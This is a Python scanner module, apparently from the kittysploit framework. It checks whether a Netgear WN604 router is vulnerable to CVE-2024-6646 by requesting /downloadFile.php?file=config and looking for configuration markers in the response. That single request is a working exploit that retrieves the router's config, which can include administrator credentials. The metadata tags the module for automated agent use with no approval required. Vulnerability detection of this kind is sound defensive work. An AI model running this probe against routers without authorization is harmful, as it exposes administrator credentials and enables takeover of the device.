#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is an information leakage vulnerability in the downloadFile."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Netgear-WN604 downloadFile.php - Information Disclosure Detection',
        'description': "There is an information leakage vulnerability in the downloadFile.php interface of Netgear WN604. A remote attacker using file authentication can use this vulnerability to obtain the administrator account and password information of the wireless router, causing the router's background to be controlled. The attacker can initiate damage to the wireless network or further threaten it.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'netgear', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/wy876/POC/blob/main/Ncast%E9%AB%98%E6%B8%85%E6%99%BA%E8%83%BD%E5%BD%95%E6%92%AD%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md',
            'https://github.com/mikutool/vul/issues/1',
            'https://vuldb.com/?ctiid.271052',
            'https://vuldb.com/?id.271052',
            'https://vuldb.com/?submit.367382',
        ],
        'cve': 'CVE-2024-6646',
    }

    def run(self):
        path = '/downloadFile.php?file=config'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('system:basicSettings', 'system:staSettings',)
        ctype_any = ('application/force-download',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='Netgear-WN604 downloadFile.php - Information Disclosure detected',
                path=path,
            )
            return True
        return False

